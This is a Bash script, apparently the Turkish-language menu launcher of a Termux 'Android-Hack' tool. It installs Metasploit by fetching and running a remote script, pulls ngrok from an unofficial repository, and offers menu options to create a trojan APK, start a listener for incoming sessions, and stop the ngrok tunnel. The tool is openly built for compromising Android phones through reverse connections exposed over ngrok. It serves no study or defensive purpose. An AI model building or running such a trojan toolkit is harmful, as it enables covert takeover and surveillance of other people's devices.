#!/bin/bash
#Coded By = UmuT KaRa
if [[ $1 == güncelle ]];then
	cd files
	bash güncelleme.sh güncelle
	exit
fi
kontrol=$(which msfconsole |wc -l)
if [[ $kontrol == 0 ]];then
	echo
	echo
	echo
	printf "\e[33m[*] \e[97mMETASPOLİT FRAMEWORK KURULUYOR"
	echo
	echo
	echo
	sleep 1
	printf "\e[33m[*] \e[97mKURULUM BİRAZ UZUN SÜREBİLİR LÜTFEN BEKLEYİNİZ.."
	echo
	echo
	echo
	pkg install -y wget&&wget https://raw.githubusercontent.com/hax4us/metasploit_Termux/master/metasploit.sh&&chmod 777 metasploit.sh&&bash metasploit.sh
	rm metasploit.sh
	echo
	echo
	echo
	printf "\e[32m[✓] \e[97mMETASPOLİT FRAMEWORK KURULUMU TAMAMLANDI"
	echo
	echo
	echo
	sleep 2
fi
#################### CURL ####################
kontrol=$(which curl |wc -l)
if [[ $kontrol == 0 ]];then
	echo
	echo
	echo
	printf "\e[32m[✓]\e[97m CURL PAKETİ KURLUYOR"
	echo
	echo
	echo
	pkg install curl -y
fi
#################### NGROK ####################
kontrol=$(which ngrok |wc -l)
if [[ $kontrol == 0 ]];then
	echo
	echo
	echo
	printf "\e[33m[*] \e[0mNGROK YÜKLENİYOR "
	echo
	echo
	echo
	git clone https://github.com/termuxxtoolss/ngrok
	mv ngrok/ngrok /data/data/com.termux/files/usr/bin
	chmod 777 /data/data/com.termux/files/usr/bin/ngrok
	rm -rf ngrok
else
	kontrol=$(ngrok version |awk -F 'version ' {'print $2'})
	if [[ $kontrol != 2.2.6 ]];then
		rm $PREFIX/bin/ngrok
		echo
		echo
		echo
		printf "\e[33m[*] \e[0mNGROK YÜKLENİYOR "
		echo
		echo
		echo
		git clone https://github.com/termuxxtoolss/ngrok
		mv ngrok/ngrok /data/data/com.termux/files/usr/bin
		chmod 777 /data/data/com.termux/files/usr/bin/ngrok
		rm -rf ngrok
	fi

fi
kontrol=$(ls /sdcard |wc -m)
if [[ $kontrol == 0 ]];then
	termux-setup-storage
fi
cd files
bash güncelleme.sh
bash banner.sh
function finish() {
	kontrol=$(ps aux |grep "ngrok" |grep -v grep |grep -o ngrok)
	if [[ $kontrol == ngrok ]];then
		killall ngrok
	fi
	exit
}
stty susp ""
stty eof ""
trap finish SIGINT
printf "

\e[31m[\e[97m1\e[31m]\e[97m ────────── \e[32mTROJAN APK OLUŞTUR\e[97m

\e[31m[\e[97m2\e[31m]\e[97m ────────── \e[32mDİNLEMEYE AL\e[97m

\e[31m[\e[97m3\e[31m]\e[97m ────────── \e[33mNGROK DIŞ BAĞLANTI KES\e[97m

\e[31m[\e[97mX\e[31m]\e[97m ────────── \e[31mÇIKIŞ\e[97m
"
echo
echo
echo
read -e -p $'\e[31m───────[ \e[97mSEÇENEK GİRİNİZ\e[31m ]───────►  \e[0m' secim
echo
echo
echo
if [[ $secim == 1 ]];then
	bash Trojan-oluştur.sh
	exit
elif [[ $secim == 2 ]];then
	bash Dinleme.sh
	exit
elif [[ $secim == 3 ]];then
	kapali() {
	cd ..
	kontrol=$(ps aux |grep "ngrok" |grep -v grep |grep -v index |awk '{print $2}' |wc -l)
	if [[ $kontrol == 1 ]];then
		killall ngrok
		echo
		echo
		echo
		printf "\e[32m[✓] \e[33mNGROK\e[97m ARKAPLANDAN KAPATILDI"
		echo
		echo
		echo
		sleep 2
		bash Android-Hack.sh
	else
		echo
		echo
		echo
		printf "\e[31m[*] \e[33mNGROK\e[97m ARKAPLANDA ÇALIŞMIYOR"
		echo
		echo
		echo
		sleep 2
		bash Android-Hack.sh
		exit
	fi
}
	bash pidkapat --tumu
	sleep 2
	cd ..
	bash Android-Hack.sh
	exit
elif [[ $secim == x || $secim == X ]];then
	echo
	echo
	echo
	printf "\e[31m[!] \e[97mÇIKIŞ YAPILDI"
	echo
	echo
	echo
	exit
else
	echo
	echo
	echo
	printf "\e[31m[!] \e[97mHATALI SEÇİM \e[31m!!!\e[97m"
	echo
	echo
	echo
	cd ..
	sleep 2
	bash Android-Hack.sh
fi

